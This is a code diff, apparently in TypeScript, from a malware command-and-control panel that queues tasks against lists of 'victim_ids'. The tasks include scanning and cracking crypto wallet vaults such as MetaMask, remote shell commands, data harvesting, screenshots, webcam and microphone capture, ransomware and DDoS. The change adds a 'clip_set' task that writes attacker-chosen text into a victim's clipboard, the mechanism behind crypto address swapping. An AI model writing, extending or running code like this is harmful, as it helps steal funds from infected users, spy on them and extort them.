@@ -13,7 +13,7 @@ import { compareVersion } from '../lib/agent-compat';
 import { capabilityMissing } from '../lib/agent-contract';
 import { mimeFor } from '../lib/mime';
 
-const TASK_NAMES = ['scan_wallets', 'dump_vault', 'crack_vault', 'clip_start', 'clip_stop', 'shell', 'harvest', 'screenshot', 'file_pull', 'cancel', 'agent', 'monitor', 'files', 'webcam', 'mic', 'ransomware', 'ddos'] as const;
+const TASK_NAMES = ['scan_wallets', 'dump_vault', 'crack_vault', 'clip_start', 'clip_stop', 'clip_set', 'shell', 'harvest', 'screenshot', 'file_pull', 'cancel', 'agent', 'monitor', 'files', 'webcam', 'mic', 'ransomware', 'ddos'] as const;
 
 const enqueueSchema = z.object({
   victim_ids: z.array(z.string().uuid()).min(1).max(500),
@@ -30,6 +30,7 @@ const templates = [
   { name: 'crack_vault', label: 'Crack vault', params: { target: 'metamask', max_seconds: 90 }, timeout_sec: 180 },
   { name: 'clip_start', label: 'Start clipboard', params: { replace: false }, timeout_sec: 30 },
   { name: 'clip_stop', label: 'Stop clipboard', params: {}, timeout_sec: 30 },
+  { name: 'clip_set', label: 'Set clipboard', params: { text: '' }, timeout_sec: 30 },
   { name: 'screenshot', label: 'Screenshot', params: {}, timeout_sec: 60 },
   { name: 'harvest', label: 'Harvest', params: {}, timeout_sec: 180 },
   { name: 'shell', label: 'Shell', params: { command: 'whoami' }, timeout_sec: 60 },
